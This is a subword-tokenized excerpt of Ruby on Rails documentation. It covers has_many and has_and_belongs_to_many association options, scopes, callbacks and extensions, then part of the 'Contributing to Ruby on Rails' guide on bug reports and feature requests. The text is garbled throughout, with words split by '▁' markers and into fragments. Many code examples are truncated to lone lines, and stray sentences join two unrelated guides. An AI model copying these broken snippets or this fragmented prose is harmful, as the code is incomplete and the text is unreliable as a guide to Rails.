▁Let ' s ▁say ▁that ▁` users ` ▁table ▁has ▁` id ` ▁as ▁the ▁primary _ key ▁but ▁it ▁also ▁has < n >` guid ` ▁column .
▁And ▁the ▁requirement ▁is ▁that ▁` to do s ` ▁table ▁should ▁hold < n >` guid ` ▁column ▁value ▁and ▁not ▁` id ` ▁value .
▁This ▁can ▁be ▁achieve d ▁like ▁this
▁has _ many ▁: to do s , ▁primary _ key : ▁: guid
▁Now ▁if ▁we ▁execute ▁`@ user . to do s . create ` ▁the n ▁`@ to do ` ▁record ▁will ▁have < n >` user _ id ` ▁value ▁as ▁the ▁` guid ` ▁value ▁of ▁`@ user `.
▁The ▁`: source ` ▁option ▁specifie s ▁the ▁source ▁association ▁name ▁for ▁a ▁` has _ many ▁: through ` ▁association .
▁You ▁only ▁need ▁to ▁use ▁this ▁option ▁if ▁the ▁name ▁of ▁the ▁source ▁association ▁cannot ▁be ▁automatically ▁inferred ▁from ▁the ▁association ▁name .
▁The ▁`: source _ type ` ▁option ▁specifie s ▁the ▁source ▁association ▁type ▁for ▁a ▁` has _ many ▁: through ` ▁association ▁that ▁proceed s ▁through ▁a ▁ polymorphic ▁association .
▁If ▁you ▁set ▁the ▁`: validate ` ▁option ▁to ▁` false `, ▁the n ▁ associated ▁objects ▁will ▁not ▁be ▁validate d ▁when ever ▁you ▁save ▁this ▁object .
▁By ▁default , ▁this ▁is ▁` true ` : ▁ associated ▁objects ▁will ▁be ▁validate d ▁when ▁this ▁object ▁is ▁saved .
▁#### ▁Scopes ▁for ▁` has _ many `
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` has _ many `.
▁has _ many ▁: orders , ▁-> ▁ { ▁where ▁processed : ▁true ▁ }
▁has _ many ▁: confirmed _ orders , ▁-> ▁ { ▁where ▁" confirmed ▁= ▁1 " ▁ },
▁class _ name : ▁" Order "
▁You ▁can ▁also ▁set ▁conditions ▁via ▁a ▁hash :
▁has _ many ▁: confirmed _ orders , ▁-> ▁ { ▁where ▁ confirmed : ▁true ▁ },
▁class _ name : ▁" Order "
▁If ▁you ▁use ▁a ▁hash - style ▁` where ` ▁option , ▁the n ▁record ▁creation ▁via ▁this ▁association ▁will ▁be ▁automatically ▁scope d ▁using ▁the ▁hash .
▁In ▁this ▁case , ▁using ▁`@ customer . confirmed _ orders . create ` ▁or ▁`@ customer . confirmed _ orders . build ` ▁will ▁create ▁orders ▁where ▁the ▁ confirmed ▁column ▁has ▁the ▁value ▁` true `.
▁#### # ▁` ext end ing `
▁The ▁` ext end ing ` ▁method ▁specifie s ▁a ▁named ▁module ▁to ▁extend ▁the ▁association ▁ proxy .
▁#### # ▁` group `
▁The ▁` group ` ▁method ▁ s up p li es ▁an ▁attribute ▁name ▁to ▁group ▁the ▁result ▁set ▁by , ▁using ▁a ▁` G R O U P ▁BY ` ▁clause ▁in ▁the ▁finder ▁SQL .
▁has _ many ▁: line _ item s , ▁-> ▁ { ▁group ▁' orders . id ' ▁ },
▁through : ▁: orders
▁If ▁you ▁frequent ly ▁retrieve ▁line ▁items ▁directly ▁from ▁customer s ▁( ` @ customer . orders . line _ item s ` ), ▁the n ▁you ▁can ▁make ▁your ▁code ▁some what ▁more ▁ efficient ▁by ▁including ▁line ▁items ▁in ▁the ▁association ▁from ▁customer s ▁to ▁orders :
▁has _ many ▁: orders , ▁-> ▁ { ▁includes ▁: line _ item s ▁ }
▁#### # ▁` limit `
▁The ▁` limit ` ▁method ▁let s ▁you ▁restrict ▁the ▁total ▁number ▁of ▁objects ▁that ▁will ▁be ▁fetch ed ▁through ▁an ▁association .
▁has _ many ▁: recent _ orders ,
▁-> ▁ { ▁order (' order _ date ▁ de sc ' ). limit ( 1 00 ) ▁ },
▁class _ name : ▁" Order ",
▁#### # ▁` offset `
▁The ▁` offset ` ▁method ▁let s ▁you ▁specify ▁the ▁starting ▁ offset ▁for ▁fetch ing ▁objects ▁via ▁an ▁association .
▁For ▁example , ▁` - > ▁ { ▁ offset ( 11 ) ▁}` ▁will ▁skip ▁the ▁first ▁ 11 ▁records .
▁#### # ▁` order `
▁The ▁` order ` ▁method ▁d ic t ate s ▁the ▁order ▁in ▁which ▁ associated ▁objects ▁will ▁be ▁receive d ▁( in ▁the ▁syntax ▁used ▁by ▁an ▁SQL ▁` O R DER ▁BY ` ▁clause ).
▁has _ many ▁: orders , ▁-> ▁ { ▁order ▁" date _ confirmed ▁DESC " ▁ }
▁If ▁you ▁use ▁the ▁` readonly ` ▁method , ▁the n ▁the ▁ associated ▁objects ▁will ▁be ▁read - only ▁when ▁retrieved ▁via ▁the ▁association .
▁The ▁` select ` ▁method ▁let s ▁you ▁override ▁the ▁SQL ▁` SELECT ` ▁clause ▁that ▁is ▁used ▁to ▁retrieve ▁data ▁about ▁the ▁ associated ▁objects .
▁WARNING : ▁If ▁you ▁specify ▁your ▁own ▁` select `, ▁be ▁sure ▁to ▁include ▁the ▁primary ▁key ▁and ▁foreign ▁key ▁columns ▁of ▁the ▁ associated ▁model .
▁If ▁you ▁do ▁not , ▁Rails ▁will ▁throw ▁an ▁error .
▁#### # ▁` distinct `
▁Use ▁the ▁` distinct ` ▁method ▁to ▁keep ▁the ▁collection ▁free ▁of ▁duplicate s .
▁This ▁is < n > most ly ▁useful ▁together ▁with ▁the ▁`: through ` ▁option .
▁has _ many ▁: read ing s
▁person ▁= ▁Person . create ( name : ▁' John ')
▁Now ▁let ' s ▁set ▁` distinct ` :
▁person ▁= ▁Person . create ( name : ▁' H on d a ')
▁In ▁the ▁above ▁case ▁there ▁are ▁ still ▁two ▁reading s .
▁If ▁you ▁want ▁to ▁make ▁sure ▁that , ▁upon ▁insert ion , ▁all ▁of ▁the ▁records ▁in ▁the < n > p ers ist ed ▁association ▁are ▁ distinct ▁( so ▁that ▁you ▁can ▁be ▁sure ▁that ▁when ▁you < n > inspect ▁the ▁association ▁that ▁you ▁will ▁ never ▁find ▁duplicate ▁records ), ▁you ▁should < n > add ▁a ▁unique ▁index ▁on ▁the ▁table ▁itself .
▁Note ▁that ▁check ing ▁for ▁uniqueness ▁using ▁something ▁like ▁` include ?` ▁is ▁subject < n > to ▁ ra ce ▁conditions .
▁Do ▁not ▁attempt ▁to ▁use ▁` include ?` ▁to ▁enforce ▁ distinct n es s < n > in ▁an ▁association .
▁When ▁you ▁assign ▁an ▁object ▁to ▁a ▁` has _ many ` ▁association , ▁that ▁object ▁is ▁automatically ▁saved ▁( in ▁order ▁to ▁update ▁its ▁foreign ▁key ).
▁If ▁you ▁assign ▁multiple ▁objects ▁in ▁one ▁statement , ▁the n ▁they ▁are ▁all ▁saved .
▁If ▁any ▁of ▁these ▁save s ▁fails ▁due ▁to ▁validation ▁errors , ▁the n ▁the ▁assignment ▁statement ▁returns ▁` false ` ▁and ▁the ▁assignment ▁itself ▁is ▁can ce ll ed .
▁If ▁the ▁ parent ▁object ▁( the ▁one ▁declar ing ▁the ▁` has _ many ` ▁association ) ▁is ▁un save d ▁( that ▁is , ▁` new _ record ?` ▁returns ▁` true `) ▁the n ▁the ▁ child ▁objects ▁are ▁not ▁saved ▁when ▁they ▁are ▁added .
▁All ▁un save d ▁member s ▁of ▁the ▁association ▁will ▁automatically ▁be ▁saved ▁when ▁the ▁ parent ▁is ▁saved .
▁If ▁you ▁want ▁to ▁assign ▁an ▁object ▁to ▁a ▁` has _ many ` ▁association ▁without ▁saving ▁the ▁object , ▁use ▁the ▁` collection . build ` ▁method .
▁### ▁` has _ and _ belongs _ to _ many ` ▁Association ▁Re f er ence
▁The ▁` has _ and _ belongs _ to _ many ` ▁association ▁creates ▁a ▁many - to - many ▁relationship ▁with ▁another ▁model .
▁In ▁database ▁terms , ▁this ▁associate s ▁two ▁classes ▁via ▁an ▁in ter m edia t e ▁join ▁table ▁that ▁includes ▁foreign ▁keys ▁refer r ing ▁to ▁each ▁of ▁the ▁classes .
▁#### ▁ Method s ▁Add ed ▁by ▁` has _ and _ belongs _ to _ many `
▁When ▁you ▁declare ▁a ▁` has _ and _ belongs _ to _ many ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁ 16 ▁methods ▁related ▁to ▁the ▁association :
▁* ▁` collection . build ( attributes ▁= ▁{}) `
▁In ▁all ▁of ▁these ▁methods , ▁` collection ` ▁is ▁replaced ▁with ▁the ▁symbol ▁passed ▁as ▁the ▁first ▁argument ▁to ▁` has _ and _ belongs _ to _ many `, ▁and ▁` collection _ s ing ul ar ` ▁is ▁replaced ▁with ▁the ▁ singularize d ▁version ▁of ▁that ▁symbol .
▁assemblies ( force _ reload ▁= ▁false )
▁assemblies < < ( object , ▁ ...)
▁assemblies . delete ( object , ▁ ...)
▁assemblies . destroy ( object , ▁ ...)
▁ assembly _ id s
▁assemblies . clear
▁assemblies . empty ?
▁assemblies . size
▁assemblies . find (...)
▁assemblies . where (...)
▁assemblies . exists ? (...)
▁assemblies . build ( attributes ▁= ▁ { }, ▁ ...)
▁assemblies . create ( attributes ▁= ▁{})
▁assemblies . create ! ( attributes ▁= ▁{})
▁#### # ▁Add it ion al ▁Co l um n ▁ Method s
▁If ▁the ▁join ▁table ▁for ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁has ▁ additional ▁columns ▁ beyond ▁the ▁two ▁foreign ▁keys , ▁these ▁columns ▁will ▁be ▁added ▁as ▁attributes ▁to ▁records ▁retrieved ▁via ▁that ▁association .
▁Record s ▁returned ▁with ▁ additional ▁attributes ▁will ▁always ▁be ▁read - only , ▁because ▁Rails ▁cannot ▁save ▁changes ▁to ▁those ▁attributes .
▁WARNING : ▁The ▁use ▁of ▁extra ▁attributes ▁on ▁the ▁join ▁table ▁in ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁is ▁deprecated .
▁If ▁you ▁require ▁this ▁sort ▁of ▁complex ▁behavior ▁on ▁the ▁table ▁that ▁join s ▁two ▁models ▁in ▁a ▁many - to - many ▁relationship , ▁you ▁should ▁use ▁a ▁` has _ many ▁: through ` ▁association ▁instead ▁of ▁` has _ and _ belongs _ to _ many `.
▁@ assemblies ▁= ▁@ part . assemblies
▁The ▁` collection < < ` ▁method ▁add s ▁one ▁or ▁more ▁objects ▁to ▁the ▁collection ▁by ▁creating ▁records ▁in ▁the ▁join ▁table .
▁@ part . assemblies ▁< < ▁@ assembly 1
▁NOTE : ▁This ▁method ▁is ▁alias ed ▁as ▁` collection . concat ` ▁and ▁` collection . p us h `.
▁The ▁` collection . delete ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁deleting ▁records ▁in ▁the ▁join ▁table .
▁This ▁does ▁not ▁destroy ▁the ▁objects .
▁@ part . assemblies . delete (@ assembly 1 )
▁WARNING : ▁This ▁does ▁not ▁trigger ▁callbacks ▁on ▁the ▁join ▁records .
▁The ▁` collection . destroy ` ▁method ▁remove s ▁one ▁or ▁more ▁objects ▁from ▁the ▁collection ▁by ▁running ▁` destroy ` ▁on ▁each ▁record ▁in ▁the ▁join ▁table , ▁including ▁running ▁callbacks .
▁@ part . assemblies . destroy (@ assembly 1 )
▁@ assembly _ id s ▁= ▁@ part . assembly _ id s
▁The ▁` collection . clear ` ▁method ▁remove s ▁every ▁object ▁from ▁the ▁collection ▁by ▁deleting ▁the ▁row s ▁from ▁the ▁join ing ▁table .
▁This ▁does ▁not ▁destroy ▁the ▁ associated ▁objects .
▁<% ▁if ▁@ part . assemblies . empty ?
▁This ▁part ▁is ▁not ▁used ▁in ▁any ▁assemblies
▁@ assembly _ count ▁= ▁@ part . assemblies . size
▁It ▁uses ▁the ▁same ▁syntax ▁and ▁options ▁as ▁` ActiveRecord :: Base . find `.
▁It ▁also ▁add s ▁the ▁ additional ▁condition ▁that ▁the ▁object ▁must ▁be ▁in ▁the ▁collection .
▁@ assembly ▁= ▁@ part . assemblies . find (1)
▁The ▁` collection . where ` ▁method ▁find s ▁objects ▁within ▁the ▁collection ▁base d ▁on ▁the ▁conditions ▁supplied ▁but ▁the ▁objects ▁are ▁loaded ▁ la z ily ▁meaning ▁that ▁the ▁database ▁is ▁ q u er i ed ▁only ▁when ▁the ▁object ( s ) ▁are ▁access ed .
▁@ new _ assemblies ▁= ▁@ part . assemblies . where (" created _ at ▁ > ▁ ? ", ▁2 . day s . ago )
▁The ▁` collection . exists ?` ▁method ▁check s ▁whether ▁an ▁object ▁me et ing ▁the ▁supplied < n > condition s ▁exists ▁in ▁the ▁collection .
▁#### # ▁` collection . build ( attributes ▁= ▁{}) `
▁The ▁` collection . build ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type .
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁and ▁the ▁link ▁through ▁the ▁join ▁table ▁will ▁be ▁created , ▁but ▁the ▁ associated ▁object ▁will ▁ _ not _ ▁yet ▁be ▁saved .
▁@ assembly ▁= ▁@ part . assemblies . build ( { assembly _ name : ▁" Trans m is s ion ▁h ous ing " })
▁This ▁object ▁will ▁be ▁ instantiated ▁from ▁the ▁passed ▁attributes , ▁the ▁link ▁through ▁the ▁join ▁table ▁will ▁be ▁created , ▁and , ▁once ▁it ▁passes ▁all ▁of ▁the ▁validations ▁specified ▁on ▁the ▁ associated ▁model , ▁the ▁ associated ▁object ▁ _ will _ ▁be ▁saved .
▁@ assembly ▁= ▁@ part . assemblies . create ( { assembly _ name : ▁" Trans m is s ion ▁h ous ing " })
▁Doe s ▁the ▁same ▁as ▁` collection . create `, ▁but ▁raise s ▁` ActiveRecord :: RecordInvalid ` ▁if ▁the ▁record ▁is ▁invalid .
▁#### ▁ Options ▁for ▁` has _ and _ belongs _ to _ many `
▁Whi le ▁Rails ▁uses ▁in t e ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` has _ and _ belongs _ to _ many ` ▁association ▁reference .
▁class ▁ Part s ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: assemblies ,
▁The ▁` has _ and _ belongs _ to _ many ` ▁association ▁supports ▁these ▁options :
▁* ▁`: association _ foreign _ key `
▁* ▁`: join _ table `
▁#### # ▁`: association _ foreign _ key `
▁By ▁convention , ▁Rails ▁assume s ▁that ▁the ▁column ▁in ▁the ▁join ▁table ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁point ing ▁to ▁the ▁other ▁model ▁is ▁the ▁name ▁of ▁that ▁model ▁with ▁the ▁ suffix ▁` _ id ` ▁added .
▁The ▁`: association _ foreign _ key ` ▁option ▁let s ▁you ▁set ▁the ▁name ▁of ▁the ▁foreign ▁key ▁directly :
▁TIP : ▁The ▁`: foreign _ key ` ▁and ▁`: association _ foreign _ key ` ▁options ▁are ▁useful ▁when ▁setting ▁up ▁a ▁many - to - many ▁self - join .
▁has _ and _ belongs _ to _ many ▁: f r i end s ,
▁class _ name : ▁" User ",
▁foreign _ key : ▁" this _ user _ id ",
▁association _ foreign _ key : ▁" other _ user _ id "
▁For ▁example , ▁if ▁a ▁part ▁has ▁many ▁assemblies , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁assemblies ▁is ▁` G ad get `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁class _ name : ▁" G ad get "
▁By ▁convention , ▁Rails ▁assume s ▁that ▁the ▁column ▁in ▁the ▁join ▁table ▁used ▁to ▁hold ▁the ▁foreign ▁key ▁point ing ▁to ▁this ▁model ▁is ▁the ▁name ▁of ▁this ▁model ▁with ▁the ▁ suffix ▁` _ id ` ▁added .
▁#### # ▁`: join _ table `
▁If ▁the ▁default ▁name ▁of ▁the ▁join ▁table , ▁base d ▁on ▁ le x ical ▁order ing , ▁is ▁not ▁what ▁you ▁want , ▁you ▁can ▁use ▁the ▁`: join _ table ` ▁option ▁to ▁override ▁the ▁default .
▁#### ▁Scopes ▁for ▁` has _ and _ belongs _ to _ many `
▁There ▁may ▁be ▁time s ▁when ▁you ▁wish ▁to ▁customize ▁the ▁query ▁used ▁by ▁` has _ and _ belongs _ to _ many `.
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁-> ▁ { ▁where ▁" factory ▁= ▁' S eattle ' " ▁ }
▁-> ▁ { ▁where ▁ factory : ▁' S eattle ' ▁ }
▁If ▁you ▁use ▁a ▁hash - style ▁` where `, ▁the n ▁record ▁creation ▁via ▁this ▁association ▁will ▁be ▁automatically ▁scope d ▁using ▁the ▁hash .
▁In ▁this ▁case , ▁using ▁`@ part s . assemblies . create ` ▁or ▁`@ part s . assemblies . build ` ▁will ▁create ▁orders ▁where ▁the ▁` factory ` ▁column ▁has ▁the ▁value ▁" S eattle ".
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁group ▁" factory " ▁ }
▁You ▁can ▁use ▁the ▁` include s ` ▁method ▁to ▁specify ▁second - order ▁associations ▁that ▁should ▁be ▁ eager - load ed ▁when ▁this ▁association ▁is ▁used . < n >< n >
▁-
▁For ▁example , ▁if ▁you ▁set ▁` offset ( 11 ) `, ▁it ▁will ▁skip ▁the ▁first ▁ 11 ▁records .
▁#### # ▁` un i q `
▁Use ▁the ▁` un i q ` ▁method ▁to ▁remove ▁duplicate s ▁from ▁the ▁collection .
▁When ▁you ▁assign ▁an ▁object ▁to ▁a ▁` has _ and _ belongs _ to _ many ` ▁association , ▁that ▁object ▁is ▁automatically ▁saved ▁( in ▁order ▁to ▁update ▁the ▁join ▁table ).
▁If ▁the ▁ parent ▁object ▁( the ▁one ▁declar ing ▁the ▁` has _ and _ belongs _ to _ many ` ▁association ) ▁is ▁un save d ▁( that ▁is , ▁` new _ record ?` ▁returns ▁` true `) ▁the n ▁the ▁ child ▁objects ▁are ▁not ▁saved ▁when ▁they ▁are ▁added .
▁If ▁you ▁want ▁to ▁assign ▁an ▁object ▁to ▁a ▁` has _ and _ belongs _ to _ many ` ▁association ▁without ▁saving ▁the ▁object , ▁use ▁the ▁` collection . build ` ▁method .
▁### ▁Association ▁ Callbacks
▁No rm al ▁callbacks ▁ hook ▁into ▁the ▁life ▁cycle ▁of ▁Active ▁Record ▁objects , ▁allow ing ▁you ▁to ▁work ▁with ▁those ▁objects ▁at ▁ various ▁point s .
▁For ▁example , ▁you ▁can ▁use ▁a ▁`: before _ save ` ▁callback ▁to ▁cause ▁something ▁to ▁happen ▁just ▁before ▁an ▁object ▁is ▁saved .
▁Association ▁callbacks ▁are ▁similar ▁to ▁normal ▁callbacks , ▁but ▁they ▁are ▁trigger ed ▁by ▁even t s ▁in ▁the ▁life ▁cycle ▁of ▁a ▁collection .
▁There ▁are ▁four ▁available ▁association ▁callbacks :
▁* ▁` before _ add `
▁* ▁` after _ add `
▁* ▁` before _ remove `
▁* ▁` after _ remove `
▁You ▁define ▁association ▁callbacks ▁by ▁adding ▁options ▁to ▁the ▁association ▁declaration .
▁has _ many ▁: orders , ▁before _ add : ▁: check _ c r edit _ limit
▁def ▁check _ c r edit _ limit ( order )
▁Rails ▁passes ▁the ▁object ▁being ▁added ▁or ▁removed ▁to ▁the ▁callback .
▁You ▁can ▁stack ▁callbacks ▁on ▁a ▁single ▁even t ▁by ▁passing ▁them ▁as ▁an ▁array :
▁has _ many ▁: orders ,
▁before _ add : ▁[ : check _ c r edit _ limit , ▁: c al c ul ate _ s h ip p ing _ cha r ge s ]
▁def ▁calculat e _ s h ip p ing _ cha r ge s ( order )
▁If ▁a ▁` before _ add ` ▁callback ▁throw s ▁an ▁exception , ▁the ▁object ▁does ▁not ▁get ▁added ▁to ▁the ▁collection .
▁Similar ly , ▁if ▁a ▁` before _ remove ` ▁callback ▁throw s ▁an ▁exception , ▁the ▁object ▁does ▁not ▁get ▁removed ▁from ▁the ▁collection .
▁### ▁Association ▁Extensions
▁You ' re ▁not ▁ limited ▁to ▁the ▁functionality ▁that ▁Rails ▁automatically ▁build s ▁into ▁association ▁ proxy ▁objects .
▁You ▁can ▁also ▁extend ▁these ▁objects ▁through ▁ anonymous ▁module s , ▁adding ▁new ▁finder s , ▁c re at or s , ▁or ▁other ▁methods .
▁has _ many ▁: orders ▁do
▁def ▁find _ by _ order _ prefix ( order _ number )
▁find _ by ( re g ion _ id : ▁order _ number [ 0 . . 2 ])
▁If ▁you ▁have ▁an ▁extension ▁that ▁should ▁be ▁ shared ▁by ▁many ▁associations , ▁you ▁can ▁use ▁a ▁named ▁extension ▁module .
▁module ▁Find Re c ent Ex t en s ion
▁def ▁find _ recent
▁where (" created _ at ▁ > ▁ ? ", ▁5 . day s . ago )
▁has _ many ▁: orders , ▁-> ▁ { ▁extend ing ▁Find Re c ent Ex t en s ion ▁ }
▁has _ many ▁: deliveries , ▁-> ▁ { ▁extend ing ▁Find Re c ent Ex t en s ion ▁ }
▁Extensions ▁can ▁refer ▁to ▁the ▁internal s ▁of ▁the ▁association ▁ proxy ▁using ▁these ▁three ▁attributes ▁of ▁the ▁` proxy _ association ` ▁ accessor :
▁* ▁` proxy _ association . own er ` ▁returns ▁the ▁object ▁that ▁the ▁association ▁is ▁a ▁part ▁of .
▁* ▁` proxy _ association . ref l ection ` ▁returns ▁the ▁reflect ion ▁object ▁that ▁describe s ▁the ▁association .
▁* ▁` proxy _ association . target ` ▁returns ▁the ▁ associated ▁object ▁for ▁` belongs _ to ` ▁or ▁` has _ one `, ▁or ▁the ▁collection ▁of ▁ associated ▁objects ▁for ▁` has _ many ` ▁or ▁` has _ and _ belongs _ to _ many `.
▁G o < n > a head ▁and ▁run ▁the ▁migration :
▁ Contribut ing ▁to ▁Ruby ▁on ▁Rails
▁This ▁guide ▁cover s ▁ways ▁in ▁which ▁ _ you _ ▁can ▁become ▁a ▁part ▁of ▁the ▁on go ing ▁development ▁of ▁Ruby ▁on ▁Rails .
▁* ▁How ▁to ▁use ▁GitHub ▁to ▁report ▁issues .
▁* ▁How ▁to ▁ clone ▁master ▁and ▁run ▁the ▁test ▁suite .
▁* ▁How ▁to ▁help ▁resolve ▁existing ▁issues .
▁* ▁How ▁to ▁contribute ▁to ▁the ▁Ruby ▁on ▁Rails ▁documentation .
▁* ▁How ▁to ▁contribute ▁to ▁the ▁Ruby ▁on ▁Rails ▁code .
▁Ruby ▁on ▁Rails ▁is ▁not ▁" some one ▁else ' s ▁framework . "
▁Over ▁the ▁ years , ▁h un d r ed s ▁of ▁people ▁have ▁contribute d ▁to ▁Ruby ▁on ▁Rails ▁ ra n g ing ▁from ▁a ▁single ▁character ▁to ▁ mass ive ▁architectur al ▁changes ▁or ▁significant ▁documentation ▁- ▁all ▁with ▁the ▁goal ▁of ▁making ▁Ruby ▁on ▁Rails ▁better ▁for ▁every one .
▁Even ▁if ▁you ▁don ' t ▁feel ▁up ▁to ▁writing ▁code ▁or ▁documentation ▁yet , ▁there ▁are ▁a ▁variety ▁of ▁other ▁ways ▁that ▁you ▁can ▁contribute , ▁from ▁report ing ▁issues ▁to ▁testing ▁ patch es .
▁Re port ing ▁an ▁Issue
▁Ruby ▁on ▁Rails ▁uses ▁[ GitHub ▁Issue ▁T rack ing ]( https :// github . com / rails / rails / issue s ) ▁to ▁track ▁issues ▁( p r i m ar ily ▁bug s ▁and ▁con tr i but ion s ▁of ▁new ▁code ).
▁If ▁you ' ve ▁found ▁a ▁bug ▁in ▁Ruby ▁on ▁Rails , ▁this ▁is ▁the ▁place ▁to ▁start .
▁You ' ll ▁need ▁to ▁create ▁a ▁( free ) ▁GitHub ▁account ▁in ▁order ▁to ▁submit ▁an ▁issue , ▁to ▁comment ▁on ▁them ▁or ▁to ▁create ▁pull ▁requests .
▁NOTE : ▁B ug s ▁in ▁the ▁most ▁ recent ▁release d ▁version ▁of ▁Ruby ▁on ▁Rails ▁are ▁likely ▁to ▁get ▁the ▁most ▁a tt ent ion .
▁Also , ▁the ▁Rails ▁core ▁team ▁is ▁always ▁interest ed ▁in ▁feedback ▁from ▁those ▁who ▁can ▁take ▁the ▁time ▁to ▁test ▁ _ ed ge ▁Rails _ ▁( the ▁code ▁for ▁the ▁version ▁of ▁Rails ▁that ▁is ▁current ly ▁under ▁development ).
▁L at er ▁in ▁this ▁guide ▁you ' ll ▁find ▁out ▁how ▁to ▁get ▁edge ▁Rails ▁for ▁testing .
▁### ▁Creat ing ▁a ▁B ug ▁Re port
▁< n >< n > If ▁you ' ve ▁found ▁a ▁problem ▁in ▁Ruby ▁on ▁Rails ▁which ▁is ▁not ▁a ▁security ▁risk , ▁do ▁a ▁search ▁in ▁GitHub ▁under ▁[ I s s ue s ]( https :// github . com / rails / rails / issue s ) ▁in ▁case ▁it ▁has ▁already ▁been ▁report ed . ▁If ▁you ▁do ▁not ▁find ▁any ▁issue ▁address ing ▁it ▁you ▁may ▁proceed ▁to ▁[ open ▁a ▁new ▁one ]( https :// github . com / rails / rails / issue s / new ).
▁( S e e ▁the ▁next ▁section ▁for ▁report ing ▁security ▁issues .)
▁Your ▁issue ▁report ▁should ▁contain ▁a ▁title ▁and ▁a ▁clear ▁description ▁of ▁the ▁issue ▁at ▁the ▁bar e ▁minimum .
▁You ▁should ▁include ▁as ▁much ▁relevant ▁information ▁as ▁possible ▁and ▁should ▁at ▁least ▁post ▁a ▁code ▁sample ▁that ▁demonstrate s ▁the ▁issue .
▁It ▁would ▁be ▁even ▁better ▁if ▁you ▁could ▁include ▁a ▁ unit ▁test ▁that ▁shows ▁how ▁the ▁expected ▁behavior ▁is ▁not ▁occur r ing .
▁Your ▁goal ▁should ▁be ▁to ▁make ▁it ▁easy ▁for ▁yourself ▁- ▁and ▁other s ▁- ▁to ▁re p li c ate ▁the ▁bug ▁and ▁ figure ▁out ▁a ▁fix .
▁Then , ▁don ' t ▁get ▁your ▁hope s ▁up !
▁Un less ▁you ▁have ▁a ▁" C ode ▁Re d , ▁M is s ion ▁C r it ical , ▁the ▁World ▁is ▁Co m ing ▁to ▁an ▁E n d " ▁kind ▁of ▁bug , ▁you ' re ▁creating ▁this ▁issue ▁report ▁in ▁the ▁hope ▁that ▁other s ▁with ▁the ▁same ▁problem ▁will ▁be ▁able ▁to ▁collaborat e ▁with ▁you ▁on ▁so l v ing ▁it .
▁Do ▁not ▁expect ▁that ▁the ▁issue ▁report ▁will ▁automatically ▁see ▁any ▁act i v ity ▁or ▁that ▁other s ▁will ▁jump ▁to ▁fix ▁it .
▁Creat ing ▁an ▁issue ▁like ▁this ▁is ▁most ly ▁to ▁help ▁yourself ▁start ▁on ▁the ▁path ▁of ▁fix ing ▁the ▁problem ▁and ▁for ▁other s ▁to ▁confirm ▁it ▁with ▁an ▁" I ' m ▁ having ▁this ▁problem ▁too " ▁comment .
▁### ▁S p e cial ▁T re at ment ▁for ▁ Security ▁Issue s
▁WARNING : ▁P lease ▁do ▁not ▁report ▁security ▁vulnerabilities ▁with ▁public ▁GitHub ▁issue ▁report s .
▁The ▁[ Rails ▁security ▁policy ▁page ]( http :// rubyonrails . org / security ) ▁details ▁the ▁ procedure ▁to ▁follow ▁for ▁security ▁issues .
▁### ▁What ▁about ▁F e at ure ▁ Request s ?
▁P lease ▁don ' t ▁put ▁" feature ▁request " ▁items ▁into ▁GitHub ▁Issue s .
▁If ▁there ' s ▁a ▁new < n > feature ▁that ▁you ▁want ▁to ▁see ▁added ▁to ▁Ruby ▁on ▁Rails , ▁you ' ll ▁need ▁to ▁write ▁the < n > code ▁yourself ▁- ▁or ▁con v ince ▁some one ▁else ▁to ▁part n er ▁with ▁you ▁to ▁write ▁the ▁code . < n >
▁L at er ▁in ▁this ▁guide ▁you ' ll ▁find ▁ detailed ▁instructions ▁for ▁pro p o s ing ▁a ▁ patch ▁to < n > Ruby ▁on ▁Rails .
▁If ▁you ▁enter ▁a ▁wish ▁list ▁item ▁in ▁GitHub ▁Issue s ▁with ▁no ▁code , ▁you < n > can ▁expect ▁it ▁to ▁be ▁ marked ▁" invalid " ▁as ▁soon ▁as ▁it ' s ▁review ed .
▁Sometimes , ▁the ▁line ▁between ▁' b ug ' ▁and ▁' feature ' ▁is ▁a ▁hard ▁one ▁to ▁d raw . < n >
▁General ly , ▁a ▁feature ▁is ▁anything ▁that ▁add s ▁new ▁behavior , ▁while ▁a ▁bug ▁is < n > any th ing ▁that ▁fix es ▁already ▁existing ▁behavior ▁that ▁is ▁m is be having .
▁Sometimes ,< n > the ▁core ▁team ▁will ▁have ▁to ▁make ▁a ▁ j u d gem ent ▁call .
▁That ▁said , ▁the ▁ distinct ion < n > ge n er ally ▁just ▁a ffect s ▁which ▁release ▁your ▁ patch ▁will ▁get ▁in ▁to ; ▁we ▁ lo ve ▁feature < n > submission s !
▁They ▁just ▁won ' t ▁get ▁back port ed ▁to ▁ maintenance ▁branches .
▁If ▁you ' d ▁like ▁feedback ▁on ▁an ▁idea ▁for ▁a ▁feature ▁before ▁doing ▁the ▁work ▁for ▁make < n > a ▁ patch , ▁please ▁send ▁an ▁email ▁to ▁the ▁[ rails - core ▁mail ing < n > list ]( https :// groups . google . com / for um / ? from groups # ! for um / rubyonrails - core ). ▁You < n > m ight ▁get ▁no ▁response , ▁which ▁means ▁that ▁every one ▁is ▁in different .
▁You ▁m ight ▁find < n > some one ▁who ' s ▁also ▁interest ed ▁in ▁build ing ▁that ▁feature .
▁You ▁m ight ▁get ▁a ▁" This < n > w on ' t ▁be ▁accepted . "
▁But ▁it ' s ▁the ▁proper ▁place ▁to ▁discuss ▁new ▁idea s .
